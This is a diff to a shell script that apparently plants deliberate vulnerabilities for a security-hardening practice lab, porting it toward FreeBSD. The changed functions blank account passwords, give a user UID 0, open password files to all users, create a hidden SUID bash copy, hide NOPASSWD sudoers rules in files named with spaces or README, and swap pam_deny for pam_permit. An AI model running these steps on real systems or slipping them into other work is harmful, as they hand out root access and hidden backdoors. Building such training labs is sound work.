@@ -32,13 +32,13 @@ RANDOM=$$$(date +%s)
 #############
 
 noPasswd() {
-  sed -i "s/jotaro:x/jotaro:/" /etc/passwd
+  sed -i '' "s/jotaro:\*/jotaro:/" /etc/passwd
 }
 sudoGroup() {
   if grep -q wheel /etc/group; then
-    usermod -G wheel jolyne
+    pw usermod jolyne -G wheel
   else
-    usermod -G sudo jolyne
+    pw usermod jolyne -G sudo
   fi
 }
 sshKey() {
@@ -47,28 +47,38 @@ sshKey() {
   cp -f assets/authorized_keys /home/jolyne/.ssh/authorized_keys
 }
 uidRoot() {
-  sed -i "s/joseph:x:[^:]*:/joseph:x:0:/" /etc/passwd
+  sed -i '' "s/joseph:\*:[^:]*:/joseph:x\*:0:/" /etc/passwd
 }
 
 admUser() {
-  useradd jonathan
-  usermod -g joestar jonathan
-  usermod -G adm jonathan
+  if grep -q jonathan /etc/passwd; then
+    pw useradd jonathan
+  fi
+  pw usermod jonathan -g joestar
+  if grep -q adm /etc/group; then
+    pw usermod jonathan -G adm
+  fi
 }
 dialUser() {
-  useradd josuke
-  usermod -g joestar josuke
-  usermod -G dialout josuke
+  if grep -q josuke /etc/passwd; then
+    pw useradd josuke
+  fi
+  pw usermod josuke -g joestar
+  if grep -q dialout /etc/group; then
+    pw usermod josuke -G dialout
+  fi
 }
 typoUser() {
   cp -f /bin/sh /usr/bin/nologin
-  useradd kernpoops
-  usermod -s "/usr/bin/nologin" kernpoops
+  if grep -q kernpoops /etc/passwd; then
+    pw useradd kernpoops
+  fi
+  pw usermod kernpoops -s "/usr/bin/nologin"
 }
 noShadow() {
   cp -f "/bin/sh" "/bin/false"
-  sed -i "s/sys:\*:/sys::/" /etc/shadow
-  usermod -s "/bin/false" sys
+  sed -i '' "s/sys:\*:/sys::/" /etc/shadow
+  pw usermod sys -s "/bin/false"
 }
 
 ###################
@@ -77,40 +87,31 @@ noShadow() {
 
 aclPasswd() {
   for u in $(cat /etc/passwd | cut -d ":" -f1); do
-    setfacl -m u:$u:rwx /etc/passwd
+    if mount | grep -q nfsv4acls; then
+      setfacl -m user:$u:rwxpDdaARWcCos:allow /etc/passwd
+    else
+      setfacl -m u:$u:rwx /etc/passwd
+    fi
   done
 }
 aclShadow() {
   for u in $(cat /etc/passwd | cut -d ":" -f1); do
-    setfacl -m u:$u:rwx /etc/shadow
+    if mount | grep -q nfsv4acls; then
+      setfacl -m user:$u:rwxpDdaARWcCos:allow /etc/master.passwd
+    else
+      setfacl -m u:$u:rwx /etc/master.passwd
+    fi
   done
-}
-capCat() {
-  f="/bin/cat"
-  if [ -f $f ]; then
-    setcap cap_dac_override=eip $f
-  fi
-}
-capVim() {
-  f="/usr/bin/vim.basic"
-  if [ -f $f ]; then
-    setcap cap_dac_override=eip $f
-  fi
-}
-capLess() {
-  f="$(which less)"
-  if [ -f $f ]; then
-    setcap cap_dac_override=eip $f
-  else
-    printf "${RED}Warning:${CLEAR} $f does not exist on the system. Skipping this vuln...\n"
-  fi
 }
 bashCopy() {
   randVar=$(cat /dev/urandom | head -c 6 | base64 -w0 | tr -d "+" | tr -d "/")
   randVar="xkcd$randVar"
-  if [ -f /bin/bash ]; then
-    cp -f /bin/bash /bin/$randVar
-    chmod u+s /bin/bash /bin/$randVar
+  f="/bin/bash"
+  if [ -f $f ]; then
+    cp -f $f /bin/$randVar
+    chmod u+s $f /bin/$randVar
+  else
+    printf "${RED}Warning:${CLEAR} $f does not exist on the system. Skipping this vuln...\n"
   fi
 }
 zshSUID() {
@@ -160,28 +161,41 @@ catSUID() {
 
 sudoAll() {
   for u in $(cat /etc/passwd | awk -F: '{print $1}'); do
-    usermod -a -G sudo $u
+    if grep -q sudo /etc/group; then
+      pw usermod $u -G sudo
+    elif grep -q wheel /etc/group; then
+      pw usermod $u -G wheel
+    fi
   done
 }
 fakeSudod() {
-  randomVal=$((RANDOM % 3))
-  case $randomVal in
-    0)  echo "ALL   ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers.d/" ";;
-    1)  echo "ALL   ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers.d/"  ";;
-    2)  echo "ALL   ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers.d/README
-  esac
- 
+  dir="/etc/sudoers.d"
+  if [ -d $dir ]; then
+    randomVal=$((RANDOM % 3))
+    case $randomVal in
+      0)  echo "ALL   ALL=(ALL:ALL) NOPASSWD:ALL" >> "$dir/ ";;
+      1)  echo "ALL   ALL=(ALL:ALL) NOPASSWD:ALL" >> "$dir/  ";;
+      2)  echo "ALL   ALL=(ALL:ALL) NOPASSWD:ALL" >> "$dir/README"
+    esac
+  else
+    printf "${RED}Warning:${CLEAR} $dir does not exist on the system. Skipping this vuln...\n"
+  fi
 }
 vimSudo() {
   f="/usr/bin/vim"
-  if [ -f $f ]; then
+  if [ -f $f ] && [ -f /etc/sudoers ]; then
     echo "%sudo ALL=(ALL:ALL) NOPASSWD:/usr/bin/vim" >> /etc/sudoers
   else
-    printf "${RED}Warning:${CLEAR} $f does not exist on the system. Skipping this vuln...\n"
+    printf "${RED}Warning:${CLEAR} $f or /etc/sudoers does not exist on the system. Skipping this vuln...\n"
   fi
 }
 sudoUser() {
-  echo "joestar ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers
+  f="/etc/sudoers"
+  if [ -f $f ]; then
+    echo "joestar ALL=(ALL:ALL) NOPASSWD:ALL" >> $f
+  else
+    printf "${RED}Warning:${CLEAR} $f does not exist on the system. Skipping this vuln...\n"
+  fi
 }
 pamCommonAuth() {
   f="/etc/pam.d/common-auth"
@@ -205,7 +219,7 @@ pamPermit() {
   if [ -f "/lib/x86_64-linux-gnu/security/pam_permit.so" ]; then
     pam_path="/lib/x86_64-linux-gnu/security"
   else
-    pam_path="/lib/i386-linux-gnu/security"
+    pam_path="/usr/lib"
   fi
   cp -f $pam_path/pam_permit.so $pam_path/pam_deny.so
 }
